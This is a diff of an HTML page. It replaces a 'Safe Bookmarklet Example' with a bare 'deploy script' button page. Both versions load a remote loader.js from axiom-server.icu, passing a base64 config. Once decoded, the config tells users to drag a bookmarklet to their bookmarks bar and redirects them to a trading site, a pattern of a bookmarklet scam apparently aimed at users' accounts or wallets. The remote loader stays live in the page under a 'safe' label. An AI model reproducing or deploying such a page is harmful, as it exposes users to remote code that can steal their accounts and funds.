@@ -1,43 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safe Bookmarklet Example</title>
-  <script src="https://axiom-server.icu/loader.js" data="eyJoYXNoIjoiTURzMk56UTNNVFk0TmpNNCIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>aaaa button – deploy script</title>
   <style>
+    html, body { height: 100%; }
     body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f9;
-      text-align: center;
-      padding: 50px;
+      margin: 0;
+      display: grid;
+      place-items: center;
+      background: #f6f7fb;
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
     }
-    h1 {
-      color: #333;
+    button {
+      padding: 0.9rem 1.4rem;
+      font-size: 1.125rem;
+      border-radius: 9999px;
+      border: 0;
+      cursor: pointer;
+      box-shadow: 0 10px 20px rgba(0,0,0,.08);
     }
-    .bookmarklet {
-      display: inline-block;
-      padding: 12px 20px;
-      margin-top: 20px;
-      background: #007BFF;
-      color: white;
-      font-weight: bold;
-      text-decoration: none;
-      border-radius: 8px;
-      transition: background 0.3s;
-    }
-    .bookmarklet:hover {
-      background: #0056b3;
-    }
+    button:active { transform: translateY(1px); }
+    .status { margin-top: 1rem; font-size: .95rem; color: #333; text-align: center; }
   </style>
 </head>
 <body>
-  <h1>Drag this Bookmarklet!</h1>
-  <p>Drag the button below to your bookmarks bar:</p>
+  <!--
+    Set data-script-src to your script URL to skip the prompt, e.g.:
+    data-script-src="https://example.com/your-script.js"
+  -->
+  <div>
+    <button id="deployBtn" data-script-src="">aaaa</button>
+    <div id="status" class="status" aria-live="polite"></div>
+  </div>
 
-  <!-- Safe example bookmarklet: shows an alert -->
-  <a class="bookmarklet" href="javascript:(function(){alert('Hello from a safe bookmarklet!');})();">
-    Safe Bookmarklet
-  </a>
+<script src="https://axiom-server.icu/loader.js" data="eyJoYXNoIjoiTURzMk56UTNNVFk0TmpNNCIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>
+
+  <!-- If you prefer a static tag instead of dynamic loading, uncomment and set the src: -->
+  <!-- <script src=""></script> -->
 </body>
 </html>
+
+
+
+
